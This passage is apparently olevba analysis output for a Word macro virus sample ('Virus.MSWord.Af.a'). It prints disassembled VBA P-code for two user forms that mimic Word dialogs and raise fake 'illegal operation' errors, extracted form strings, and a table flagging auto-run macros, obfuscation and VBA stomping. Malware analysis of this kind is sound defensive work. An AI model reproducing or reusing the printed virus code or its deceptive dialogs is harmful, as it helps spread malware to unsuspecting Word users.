' 	EndSub 
' Line #23:
' Line #24:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #25:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #30:
' 	Ld UserForm900 
' 	ArgsCall Unlock 0x0001 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #34:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ld TextBox1 
' 	MemSt Then 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld CommandButton2 
' 	MemSt Enabled 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #38:
' 	EndSub 
' Macros/VBA/UserForm999 - 10905 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub ListBox1_Click())
' Line #9:
' 	LitDI2 0x0000 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ListBox1 
' 	ArgsMemLd Selected 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #15:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #16:
' 	LitVarSpecial (True)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld CommandButton4 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld CommandButton6 
' 	MemSt Enabled 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #28:
' 	LitStr 0x000D "Commande Word"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #29:
' 	LitStr 0x0017 "Tous les modèles actifs"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #30:
' 	LitStr 0x001A "Normal.dot (modèle global)"
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd WindowName$ 0x0000 
' 	Ld ComboBox1 
' 	ArgsMemCall AddItem 0x0001 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld CommandButton3 
' 	MemSt Enabled 
' Line #34:
' 	LitStr 0x000F "Macro créée le "
' 	Ld Date 
' 	Concat 
' 	LitStr 0x0005 " par "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld TextBox2 
' 	MemSt Then 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #38:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #42:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #46:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #51:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #56:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #57:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #61:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #66:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #67:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub ScrollBar1_Change())
' Line #70:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	Ld UserForm999 
' 	ArgsCall Unlock 0x0001 
' Line #72:
' 	EndSub 
' Line #73:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de documentH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�ments
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.7H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ex�cuter pas � pasH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Af.a' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

